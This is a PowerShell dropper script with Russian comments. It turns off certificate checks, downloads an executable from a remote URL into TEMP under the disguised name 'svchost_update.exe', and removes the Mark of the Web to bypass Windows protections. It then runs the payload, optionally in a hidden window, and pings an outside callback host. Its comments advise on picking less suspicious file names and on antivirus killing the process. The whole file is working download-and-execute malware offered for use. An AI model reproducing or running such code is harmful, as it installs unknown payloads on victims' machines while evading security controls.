# 1. Принудительный TLS 1.2 и игнорирование ошибок сертификатов
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# 2. ВРЕМЕННО включаем показ ошибок, чтобы видеть, где именно затык. 
# (Когда всё заработает, поменяйте 'Continue' обратно на 'SilentlyContinue')
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'

$exeName = "svchost_update.exe" # Лучше использовать менее подозрительное имя, чем putty.exe
$exePath = Join-Path $env:TEMP $exeName
$url = "https://github.com/reika911/BOENG/raw/refs/heads/main/sysinfo_upx.exe"
$callbackUrl = "https://postlmg.pics/x/ImxVux7YXaqisWZODtz5Mx2fflg"

try {
    Write-Host "[*] Attempting to download payload..." -ForegroundColor Cyan

    # Метод А: Invoke-WebRequest (более надёжен в современных PS)
    iwr -Uri $url -OutFile $exePath -UseBasicParsing -ErrorAction Stop

    # Метод Б: Fallback на WebClient, если IWR заблокирован
    if (-not (Test-Path $exePath)) {
        Write-Host "[*] IWR failed, trying WebClient fallback..." -ForegroundColor Yellow
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($url, $exePath)
    }

    # Проверка: действительно ли файл существует и имеет размер > 0
    if (Test-Path $exePath) {
        $size = (Get-Item $exePath).Length
        if ($size -eq 0) { throw "Downloaded file is empty (0 bytes)" }
        
        Write-Host "[+] Downloaded successfully: $size bytes" -ForegroundColor Green

        # Снятие метки "Загружено из интернета" (Mark of the Web)
        Write-Host "[*] Bypassing Mark of the Web..." -ForegroundColor Cyan
        Unblock-File -Path $exePath -ErrorAction SilentlyContinue
        Remove-Item -Path "$exePath:Zone.Identifier" -Force -ErrorAction SilentlyContinue

        Write-Host "[*] Executing payload..." -ForegroundColor Cyan
        
        # Запуск процесса. Добавьте -WindowStyle Hidden, если нужно скрыть окно
        $proc = Start-Process -FilePath $exePath -PassThru # -WindowStyle Hidden

        Start-Sleep -Seconds 3

        if ($proc.HasExited) {
            Write-Warning "[-] Process exited immediately (Code: $($proc.ExitCode))."
            Write-Warning "    ПРИЧИНА: Скорее всего, Windows Defender или AV убил процесс при запуске."
        } else {
            Write-Host "[+] Process started successfully (PID: $($proc.Id))" -ForegroundColor Green
        }
    } else {
        throw "File was not created at $exePath. Check network/AV."
    }
} catch {
    Write-Host "=========================================" -ForegroundColor Red
    Write-Host "[-] FATAL ERROR DURING EXECUTION:" -ForegroundColor Red
    Write-Host "Exception: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "=========================================" -ForegroundColor Red
    
    # Оставляем окно открытым на 10 секунд, чтобы вы успели прочитать ошибку (удалите для продакшена)
    Start-Sleep -Seconds 10
} finally {
    # Отправляем callback на ваш сервер в любом случае (успех или провал)
    try { 
        iwr -Uri $callbackUrl -UseBasicParsing -TimeoutSec 5 -Method Get | Out-Null 
    } catch {}
}
